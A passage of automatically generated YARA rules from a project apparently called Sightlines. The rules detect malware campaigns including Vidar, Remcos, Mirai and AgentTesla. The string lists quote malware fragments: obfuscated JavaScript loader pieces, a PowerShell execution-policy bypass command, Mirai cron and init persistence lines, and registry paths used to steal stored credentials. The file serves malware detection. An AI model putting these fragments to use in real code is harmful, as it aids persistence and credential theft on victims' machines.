        description = "Strings shared by the samples of campaign tlsh-5d3c973c"
        date = "2026-10-24"
        campaign = "tlsh-5d3c973c"
        family = ""
        hash = "0a575410df7bb5c5d13aa46acdff196c566e748533c9b4be0d64af1213050a20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5d3c973c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "MsZCksRC5vcGVuKChbMTI2LCAxMjQsIDEwOV0ubWFwKHggPT4ge3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKHggXiA1Nyk7fS" ascii
        $s1 = "VuY3Rpb24gTihNLEkpe3JldHVybiBNPj4+SXxNPDwzMi1JfWNvbnN0IEQ9TWF0aC5wb3csZz1EKDIsMzIpLFQ9KFs4OSwgODAsID" ascii
        $s2 = "BjPU1hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnNsaWNlKDIsVCg1LDEwKSksZD1UKDAsMSk7Zy5zZWFyY2hQYXJhbXMuc2V0KG" ascii
        $s3 = "ExJiYoZVtNXT1uZXcgRnVuY3Rpb24oYXRvYihJKSkoKSl9fTs=\"))();const fqMaGkN7=globalThis.obChTK.hPL3On([119" ascii
        $s4 = "onst T=fqMaGkN7.Ot(R);T&&(R=new XMLHttpRequest,V=T+[69,31,71].map(V=>String.fromCharCode(122^V)).joi" ascii
        $s5 = "kxLCA4MiwgNjUsIDkzXS5tYXAoeCA9PiB7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoeCBeIDUzKTt9KS5qb2luKCIiKSk7bG" ascii
        $s6 = "1NfSxlVzRfX0g6ZnVuY3Rpb24oTSl7ZS5wPU19LGhQTDNPbjpjLFpLdkQwZTphc3luYyBmdW5jdGlvbihNKXtpZihNIGluIGU9PS" ascii
        $s7 = "Q8PCgzLWMpJTQqOH1mb3IoTFtMW1RdXT1iL2d8MCxMW0xbVF1dPWIsZD0wO2Q8TFtUXTspe2NvbnN0IE09TC5zbGljZShkLGQrPT" ascii
        $s8 = "V0IGMsZDtjb25zdCBMPVtdLGI9OCpNW1RdO2xldCBpPUlNLmg9SU0uaHx8W107Y29uc3QgeT1JTS5rPUlNLmt8fFtdO2xldCBDPX" ascii
        $s9 = "Y4MDYwNCk7Yys9TSlYW2NdPU07aVtDXT1EKE0sLjUpKmd8MCx5W0MrK109RChNLDEvMykqZ3wwfWZvcihNKz0igCI7TVtUXSU2NC" ascii
        $s10 = "01NjspTSs9IlwwIjtmb3IoYz0wO2M8TVtUXTtjKyspe2lmKGQ9TS5jaGFyQ29kZUF0KGMpLGQ+PjgpcmV0dXJuO0xbYz4+Ml18PW" ascii
        $s11 = "].map(V=>String.fromCharCode(45^V)).join(\"\")).zn.Nn.LJ1EuL?T=!0:globalThis.obChTK.hPL3On([75,78,76,7" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_7e34bbdb_vidar
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7e34bbdb"
        date = "2026-10-24"
        campaign = "imphash-7e34bbdb"
        family = "vidar"
        hash = "21eacb925392e39b86b7a04262cdc4f9f55a21e4ae308cebf7e4d7d95e44699a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7e34bbdb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s1 = "SELECT 'CREATE TABLE vacuum_db.' || substr(sql,14)   FROM sqlite_master WHERE type='table' AND name!" ascii
        $s2 = "OH163IV7RP72254RVEFJG7NCM4RPV0Y83BMS2DVGFFPWKWA1NTG2Y3NR4YU81GL11890SMZST9EBR02Z4ZBBU6KAY5XDTXO83Y4L" ascii
        $s3 = "SELECT 'CREATE UNIQUE INDEX vacuum_db.' || substr(sql,21)   FROM sqlite_master WHERE sql LIKE 'CREAT" ascii
        $s4 = "CB530H1UO79CYM5THLYPSOVEWRUA3RITI4RNZFUKDEC5VDQQZBMX78AYQ0HJX017ZP" ascii
        $s5 = "SELECT 'DELETE FROM vacuum_db.' || quote(name) || ';' FROM vacuum_db.sqlite_master WHERE name='sqlit" ascii
        $s6 = "SELECT 'CREATE INDEX vacuum_db.' || substr(sql,14)  FROM sqlite_master WHERE sql LIKE 'CREATE INDEX " ascii
        $s7 = "MIH6SJCKVV71GJAGNEYM0R4UYHQ71XKTSN71443UZY859PZF3KQPW8R4O" ascii
        $s8 = "1EZNAJRI2KACTFKAEIDGCS26QKQ5VFBMW7YO2F8OO9749KJ08X0535ZJM27Z3WXWJXPWR5I9JY" ascii
        $s9 = "autoindex%%' AND type='index' THEN 'sqlite_autoindex_' || %Q || substr(name,%d+18) ELSE name END WHE" ascii
        $s10 = "5BWLFU17VE5ZVMMYT7T8ORK4NMAOVJ53JHMG6FAEGLRUMJKP7TBOTR7N1282UMLMJBPN9F1O7O1D9ZSEBUQCHQJ2K9PEHHU4AFLK" ascii
        $s11 = "UPDATE %Q.%s SET type='table', name=%Q, tbl_name=%Q, rootpage=0, sql=%Q WHERE rowid=#%d" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2416640 and 12 of them
}

rule Sightlines_tlsh_6fe7c653_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6fe7c653"
        date = "2026-10-24"
        campaign = "tlsh-6fe7c653"
        family = ""
        hash = "018d084a2b65856a2f7fe978c8d006a245f4fa55c189782e01675c6043774882"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6fe7c653.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "xN3t8aW1weQ4QYngYNVNyFW0JeRAKdGsRHFFaGxEJdwMpEyMHBwUGNnkTU10YCjINFzk+ODQZKVpQATQXDAs7ASILIydxaCckbQ4" ascii
        $s1 = "wZxQGcXExN3t8aW1weQ4QYngYMFMAD3xvOSMzfSsQHy9TKhIATBUIFCgILB4YORxwU2MTAWcNESUcBSRyMnNOcAsLdgRxBDcteyZ" ascii
        $s2 = "UVSokG3UkGw80BAcTY1UjLhA0MHN8Bi4sdXJ9ES80DRFxPC0wCQNbbgosBAMALRIiISAcYWsoCR10Jg0bURcHFglNDBNuMB4SeBU" ascii
        $s3 = "    var PAYLOAD_B64   = \"AAMuIjE3e3xpbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRRwZxQGcXE" ascii
        $s4 = "6IgAjDygsUncDKRN9AhV4WDMfdQBpFHBnFAZxcTE3e3xpbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRR" ascii
        $s5 = "    // STAGE 3: XOR (equivalent to XorDecryptor.decrypt)" ascii
        $s6 = "    // STAGE 9: top-level workflow (equivalent to WorkflowOrchestrator)" ascii
        $s7 = "                \"SELECT * FROM Win32_Process WHERE Name='powershell.exe' OR Name='pwsh.exe'\"" ascii
        $s8 = "    function runPowerShellAndWait(shell, fs, scriptPath) {" ascii
        $s9 = "            var doc = makeActiveX(\"MSXML2.DOMDocument.6.0\");" ascii
        $s10 = "        var innerB64 = xorDecode(xorCipher, XOR_KEY);" ascii
        $s11 = "    function killPowerShellByPath(scriptPath) {" ascii
    condition:
        filesize < 5507914 and 12 of them
}

rule Sightlines_tlsh_3685058e_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3685058e"
        date = "2026-10-24"
        campaign = "tlsh-3685058e"
        family = "remcos"
        hash = "3f7089c857d85f2e3f7d9d2f5788649e4e3520d3fd575000b1d1e8db9022c263"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3685058e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "JweQ4XalsYNVMFAl97JxUYDj03ejcJLxl8WgkFJjUDNRoNACIAQn8FODYmDTQxOzQaJmRhdS4/FG8ODDAMIQh1dycRMwUgOBw4Uw" ascii
        $s1 = "80UyMDemIJcRAqGBQSCCE8I3FwMCIwETYHADAtCCh7DxAUbnoKNnhYMx9xD2YUcGcTDlJxMTd7eGZicHkOF2pbGDVTchFiBnkQCn" ascii
        $s2 = "        PAYLOAD: \"BwsNIjE3e3hmYnB5DhdqWxg1U3IRYgZ5EApzYzIcUVobFQYPEBRuego2eFgzH3EPZhRwZxMOUnExN3t4Zm" ascii
        $s3 = "ICBh0JBRgFDxt5JTIgDEBjBTQaFiABLy03fyZkBzAwPQAbFhgIIR8YBXwwIxYRGQAPWAkqNgZ9CTkfJBMnJBQHDBdYVS0sbiYODS" ascii
        $s4 = "            var innerBase64 = Crypto.xorDecrypt(xorEncrypted, Config.XOR_KEY);" ascii
        $s5 = "    WScript.Quit(WorkflowOrchestrator.execute() ? 0 : 1);" ascii
        $s6 = "            var xmlDoc = ComFactory.create(\"MSXML2.DOMDocument.6.0\");" ascii
        $s7 = "            var scriptContent = PayloadPipeline.preprocess(Config.PAYLOAD);" ascii
        $s8 = "// Alternative Workflow Processor - Object-Oriented Variant" ascii
        $s9 = "                FileDeployer.ensureDirectory(fs, Config.WORK_DIR);" ascii
        $s10 = "            var fileName = prefix + TextProcessor.randomToken() + \".ps1\";" ascii
        $s11 = "            var cmd = \"powershell.exe -ExecutionPolicy Bypass -NoProfile \"" ascii
    condition:
        filesize < 2179026 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_4b30d7e5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-4b30d7e5"
        date = "2026-10-24"
        campaign = "dotnet_typelib_guid-4b30d7e5"
        family = ""
        hash = "1e533b6f4417c95761a96e060e12eef541fa3dd9a8c5b3888b86e99666266399"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-4b30d7e5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "Campanae Hung Dead | Clappers Drawn by Wires | Baton Clavier | Louvres Open" wide
        $s4 = "Acta relatio prospere exportata sunt secundum CarillonSchema.xsd!" wide
        $s5 = "<CarillonneurBatonAngulus>k__BackingField" ascii
        $s6 = "Nexus Linkage Vitia (Slack Defectus): 0" wide
        $s7 = "Notae Purae: {0}  |  Dynamica Vitiosa: {1}" wide
        $s8 = "Choralis Sancti Rombout (Toccata Carillonis)" wide
        $s9 = "Campanarum harmonia fideliter servata est. Transmissionis nexus recte se habent nec ullae magnae cla" wide
        $s10 = "http://tempuri.org/CarillonSchema.xsd" wide
        $s11 = "<CarillonneurBrachiumY>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7351296 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_f9229e71_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-f9229e71"
        date = "2026-10-24"
        campaign = "dotnet_typelib_guid-f9229e71"
        family = ""
        hash = "2545a93d9e794363f95aafcba44b1e791621e801ac887eecd44ed9b5f2273195"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-f9229e71.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "Calves Surviving: {0} ({1} born this cycle)" wide
        $s3 = "Lichen Pasture Recovery: {0:F1}% average biomass" wide
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s5 = "Snow Crust Lockout: Active hard crust (Foraging impaired)" wide
        $s6 = "Snow Depth: {0:F1} cm (Albedo {1:F0}%)" wide
        $s7 = "Predation Losses: {0} kills | Crust starvation: {1}" wide
        $s8 = "Supplementary Feed Stations: {0} active depots" wide
        $s9 = "Calving Success: {0} calves born to date" wide
        $s10 = "Predation Losses: {0} | Crust Starvation: {1}" wide
        $s11 = "Summer Insect Harassment: {0:F0}% intensity" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2316288 and 12 of them
}

rule Sightlines_imphash_ad2c579a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-ad2c579a"
        date = "2026-10-24"
        campaign = "imphash-ad2c579a"
        family = ""
        hash = "2cd3f398007642bba90bfa972b3587e75b6729a5b3c6efdaf8bde818c62db194"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-ad2c579a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\SystemRoot\\System32\\" wide
        $s1 = "FileUtility.exe" wide
        $s2 = "t9fD98u3HcH<" ascii
        $s3 = ".FDGS5$Yfll" ascii
        $s4 = "File Utility" wide
        $s5 = "=jcu.^^env" ascii
        $s6 = "0Lo4BJ.}E" ascii
        $s7 = "ZDcQ$Ib}m" ascii
        $s8 = "r8,^e7thc" ascii
        $s9 = "/yB|Rdt8" ascii
        $s10 = "mS8>BQdR" ascii
        $s11 = "p\\h6[^Z0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2885504 and 9 of them
}

rule Sightlines_tlsh_a59464ec_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a59464ec"
        date = "2026-10-23"
        campaign = "tlsh-a59464ec"
        family = "mirai"
        hash = "10a76ea06517991202d6766a1d55e5aba67e81600f67ea55bcbf5363ac1f6d42"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a59464ec.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curl -s -o /dev/null --max-time 15 -w '%{speed_download} %{size_download}' 'https://speed.cloudflare" ascii
        $s1 = "PRIVMSG %s :KILLED bot=%s sig=%d killer_pid=%d killer_uid=%d comm=%s exe=%s" ascii
        $s2 = "[%s] speedtest: %.2f Mbps down (%.2f MB/s, %.1f MB sample) [curl]" ascii
        $s3 = "[%s] arch: pointer=%d-bit, endian=%s, caps: threads=%d discord_socks=%d" ascii
        $s4 = "[%s] start_flood: usage: <mode> <ip> <port> [args]" ascii
        $s5 = ".com/__down?bytes=10000000' 2>/dev/null" ascii
        $s6 = "command -v speedtest-cli >/dev/null 2>&1" ascii
        $s7 = "[%s] pps_onepacket size=%d socks=%d %ds" ascii
        $s8 = "[%s] killall t%d %s syns=%ld ok=%ld writes=%ld" ascii
        $s9 = "4 32 33 36 35 65 64 66 72 34 35 34 77 72 71 65 4E 65 24 ED 65 76 E8 E7 98 7E AE D9 8E 79 87 AE AE 8E" ascii
        $s10 = "/var/tmp/.systemd-resolved-helper" ascii
        $s11 = "4 34 32 33 36 35 65 64 66 72 34 35 34 77 72 71 65 4E 65 24 ED 65 76 E8 E7 98 7E AE D9 8E 79 87 AE AE" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_9baffd86_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-9baffd86"
        date = "2026-10-23"
        campaign = "dotnet_typelib_guid-9baffd86"
        family = ""
        hash = "1a28f81ebda0180593503eca2aa2cec0e7666fe5ed076eae39d0da1a560e0e83"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-9baffd86.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "`Gets or sets the SWN p value (probability of casual) for switching algorithm (Floyd 0--p--1 BFS)" ascii
        $s2 = "CThe third parameter of the distribution (shape c, xMin, xMax, k, v)" ascii
        $s3 = "]The probability of transmission per single sexual intercourse from Male to Male, (homosexual)" ascii
        $s4 = "2The fourth parameter of the distribution (xMax, w)" ascii
        $s5 = "7Is the group's population (graph vertices) initialised." ascii
        $s6 = "%System.Globalization.NumberFormatInfo!" ascii
        $s7 = "jThe second parameter of the distribution. (scale b, shape c, xMin, xMax, degree of freedom df, d, p" ascii
        $s8 = "_Gets or sets the maximum size for numerical calculation of the network efficiency (path length)" ascii
        $s9 = "]Gets or sets the number of initial infected individuals for Temporal and Conditional warm-up." ascii
        $s10 = "VGets or sets the probability of concurrent partnerships during the simulation warm-up." ascii
        $s11 = "2Gets or Sets the simulation warm-up configuration." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2353152 and 12 of them
}

rule Sightlines_tlsh_036dcb31_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-036dcb31"
        date = "2026-10-23"
        campaign = "tlsh-036dcb31"
        family = "agenttesla"
        hash = "1308da2a18c17d5d7e4e3efa95316f53e2fb981ad9e46cda66c26b18b1faef90"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-036dcb31.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" wide
        $s1 = "HKEY_CURRENT_USER\\Software\\Aerofox\\Foxmail\\V3.1" wide
        $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s3 = "HKEY_CURRENT_USER\\Software\\Aerofox\\FoxmailPreview" wide
        $s4 = "\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt" wide
        $s5 = "\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt" wide
        $s6 = "HKEY_CURRENT_USER\\Software\\RimArts\\B2\\Settings" wide
        $s7 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "SmartFTP\\Client 2.0\\Favorites\\Quick Connect" wide
        $s9 = "Software\\A.V.M.\\Paltalk NG\\common_settings\\core\\users\\creds\\" wide
        $s10 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s11 = "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_df7e884a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-df7e884a"
        date = "2026-10-23"
        campaign = "tlsh-df7e884a"
        family = ""
        hash = "55e752670ec450ecb29c3c21f3f683e13ce7d51d0025fcff2c5f7d70ee045487"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-df7e884a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "dev/krypton/native/x86_64-windowsPK" ascii
        $s1 = "assets/minecraft/shaders/post-process/PK" ascii
        $s2 = "dev/krypton/native/x86_64-windows<" ascii
        $s3 = "assets/krypton/shaders/post-process/PK" ascii
        $s4 = "krypton-render.mixins.jsonPK" ascii
        $s5 = "assets/minecraft/shaders/PK" ascii
        $s6 = "dev/krypton/diddy/mixin/PK" ascii
        $s7 = "assets/krypton/shaders/PK" ascii
        $s8 = "assets/krypton/fonts/PK" ascii
        $s9 = "dev/krypton/xative/PK" ascii
        $s10 = "javazoom/jl/decoder/PK" ascii
        $s11 = "dev/krypton/native/PK" ascii
    condition:
        filesize < 11806636 and 12 of them
}

rule Sightlines_imphash_2937c1c9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-2937c1c9"
        date = "2026-10-23"
        campaign = "imphash-2937c1c9"
        family = ""
        hash = "34d364fb8e3789b2e477e357c78bdeaa2a4cda2da8699c979a2e297d9cddf2e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-2937c1c9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>8%D" ascii
        $s4 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s5 = "%TObjectList<System.Classes.TRegGroup>\\DH" ascii
        $s6 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s7 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s8 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s9 = "\\TList<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>.TEnumerator\\*F" ascii
        $s10 = "Embarcadero Delphi for Win32 compiler version 33.0 (26.0.36039.7899)" ascii
        $s11 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1722368 and 12 of them
}

rule Sightlines_tlsh_310c3f5a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-310c3f5a"
        date = "2026-10-23"
        campaign = "tlsh-310c3f5a"
        family = ""
        hash = "34d364fb8e3789b2e477e357c78bdeaa2a4cda2da8699c979a2e297d9cddf2e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-310c3f5a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s3 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s4 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s5 = "Embarcadero Delphi for Win32 compiler version 33.0 (26.0.36039.7899)" ascii
        $s6 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s7 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s8 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s9 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s10 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s11 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1722368 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_a714f431_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-a714f431"
        date = "2026-10-23"
        campaign = "dotnet_typelib_guid-a714f431"
        family = ""
        hash = "1d0f2d9db8cc9498ffed71d038690bfe52b39b3a1771bbfae0088db2d603cca0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-a714f431.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" wide
        $s1 = "9uzQZ8M9esiGktQ2p1awgW2VefNvdHItyTIJRslztZk=" wide
        $s2 = "BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed " wide
        $s3 = "zMaRPCbE0Gb4k/zB6ZNS3r1L34TENqMZD9RW6hkhoOE=" wide
        $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s5 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF041" wide
        $s6 = "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676" wide
        $s7 = "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676" wide
        $s8 = "BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}" wide
        $s9 = "      <!--<supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\" />-->" ascii
        $s10 = "      <!--<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\" />-->" ascii
        $s11 = "      <!--<supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\" />-->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_82a27dbf_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-82a27dbf"
        date = "2026-10-23"
        campaign = "tlsh-82a27dbf"
        family = "mirai"
        hash = "000d8b06db0f227f54e426f21534ea718d61d7381fd1c3a054ce0d354fd3d423"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-82a27dbf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "R_ARM_PC24: Compile shared libraries with -fPIC!" ascii
        $s2 = "update-rc.d S99ksync defaults 2>/dev/null || chkconfig --add S99ksync 2>/dev/null || insserv S99ksyn" ascii
        $s3 = "GCC: (Buildroot 2021.11-12449-g1bef613319) 13.3.0" ascii
        $s4 = "for exe in '%s' \"$HOME/libkys.so\" /data/local/tmp/libkys.so /data/local/.libkys.so /data/local/tmp/k" ascii
        $s5 = "for exe in '%s' /data/local/tmp/libkys.so /usr/bin/.ksync; do" ascii
        $s6 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s7 = "%s: '%s' is not an ELF executable for ARM" ascii
        $s8 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s9 = "@reboot root sleep 20 && nohup %s %s >/dev/null 2>&1 &" ascii
        $s10 = "cannot create TLS data structures: ABORT" ascii
        $s11 = "%s: cannot apply additional memory protection after relocation" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_contacted_f1a4ad7c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-f1a4ad7c"
        date = "2026-10-22"
        campaign = "contacted-f1a4ad7c"
        family = ""
        hash = "2a52182780bed76b574635a9aa621fb628e949d0f4d400c72cf49525edc6e96d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-f1a4ad7c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "NetworkIsolationGetAppContainerConfig" ascii
        $s1 = "NetworkIsolationSetAppContainerConfig" ascii
        $s2 = "NetworkIsolationEnumAppContainers" ascii
        $s3 = "NetworkIsolationFreeAppContainers" ascii
        $s4 = "FirewallAPI.pdb" ascii
        $s5 = "FirewallAPI.dll" ascii
        $s6 = "AWAVATVWUSf" ascii
        $s7 = "D$@H9D$0t" ascii
        $s8 = "AWAVATVWSL" ascii
        $s9 = "AWAVVWSfH" ascii
        $s10 = "AWAVVWUSI" ascii
        $s11 = "L$HH9L$8t" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 18285568 and 6 of them
}

rule Sightlines_tlsh_86960d55_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86960d55"
        date = "2026-10-22"
        campaign = "tlsh-86960d55"
        family = ""
        hash = "1a8ccf0b0e46e95a66c89a1ccffe573ec9e6ff781dc56e0790995429f4ff43d9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86960d55.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "skraUiUH_J=ZD6YA3YA2Z?.YNF^v}]u{YNF\\@/YB4[E8_J=eTHqcX" ascii
        $s1 = "Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{3F709462-4AD7-482F-8761-C6ED6AD145A1}" ascii
        $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{C412F191-BB15-4e40-9CCC-97E571D2C6BF}" ascii
        $s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{787DFE02-CC6C-4AAC-B455-166BBEE4C5AF}" ascii
        $s5 = ".?AV?$IDispatchImpl@UIAxWinAmbientDispatchEx@@$1?_GUID_b2d0778b_ac99_4c58_a5c8_e7724e5316b5@@3U__s_G" ascii
        $s6 = "Hide WhiteBoard~Bitmap Files (*.bmp)|*.bmp|Portable Network Graphics (*.png)|*.png|JPEG files (*.jpg" wide
        $s7 = "datalen + idata->recvbytes <= MAX_DEFLATE_SIZE (MAX_STREAMLEN)" ascii
